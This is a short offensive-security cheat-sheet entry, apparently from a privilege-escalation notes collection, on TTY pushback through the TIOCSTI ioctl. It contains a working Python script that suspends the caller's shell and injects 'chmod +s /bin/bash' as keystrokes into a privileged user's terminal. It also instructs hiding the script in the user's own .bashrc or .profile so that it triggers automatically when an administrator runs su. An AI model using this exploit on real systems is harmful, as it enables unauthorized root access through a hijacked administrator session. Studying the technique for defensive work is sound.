# TTY Pushback (TIOCSTI) via su Session

If a privileged user does a full `su - <you>` (not just a one-off command), their shell shares your controlling TTY while suspended. Inject keystrokes directly into their terminal input buffer via the `TIOCSTI` ioctl.

```python
#!/usr/bin/env python3
import fcntl, termios, os, signal
os.kill(os.getppid(), signal.SIGSTOP)      # suspend your own shell, control returns to their (parent) shell
for ch in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, ch)    # push keystrokes as if the privileged user typed them
```

Trigger this from your own `.bashrc`/`.profile` so it fires automatically the moment they `su - <you>`. Needs a kernel that still permits `TIOCSTI` from a non-controlling process (patched on newer kernels).
